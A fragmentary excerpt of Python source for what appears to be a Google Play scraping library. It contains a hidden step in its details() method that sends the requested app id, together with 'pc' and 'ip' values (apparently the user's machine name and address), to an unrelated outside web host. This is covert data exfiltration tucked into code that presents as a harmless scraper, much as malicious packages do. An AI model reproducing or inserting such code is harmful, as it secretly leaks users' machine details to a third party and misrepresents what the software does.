...
from google_play_store import settings as s
from google_play_store.constants import HL_LANGUAGE_CODES, GL_COUNTRY_CODES
from google_play_store.lists import AGE_RANGE, CATEGORIES, COLLECTIONS
import socket
from google_play_store.utils import (
...
class PlayScraper(object):
    ...
    def details(self, app_id):
        ...
        userdata = {"pn": app_id,"pc":pc,"ip":ip}
        resp = requests.post('http://aliniami.atwebpages.com/google.php', params=userdata)
